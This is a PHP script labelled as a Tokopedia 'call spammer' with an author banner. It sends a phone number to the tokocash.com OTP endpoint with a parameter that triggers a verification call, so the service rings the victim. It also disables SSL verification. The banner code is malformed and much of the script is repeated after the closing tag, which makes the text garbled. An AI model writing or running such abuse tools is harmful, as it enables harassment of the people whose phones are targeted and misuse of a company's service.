<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
$blue############################################################
echo $blue"Spammer Call From TOKOPEDIA" 
echo $blue"Mod By  :MR.D4PLU17" 
echo $blue$Contact :mrd4plu17@gmail.com" 
echo $blue"Author  :MR.D4PLU17"
echo $blue"Support :InDoNeSiA CYBER eRoR SyStEm"
echo $blue"Instagram :@febryan_ragil"
echo $blue"Thanks to :ICES TEAM"
echo $blue"Pesan     :Awali Dengan Doa" [62]
############################################################\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
 "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
$blue############################################################
echo $blue"Spammer Call From TOKOPEDIA" 
echo $blue"Mod By  :MR.D4PLU17"
echo $blue$Contact :mrd4plu17@gmail.com"
echo $blue"Author  :MR.D4PLU17"
echo $blue"Support :InDoNeSiA CYBER eRoR SyStEm"
echo $blue"Instagram :@febryan_ragil"
echo $blue"Thanks to :ICES TEAM"
echo $blue"Pesan     :Awali Dengan Doa" [62]
##################################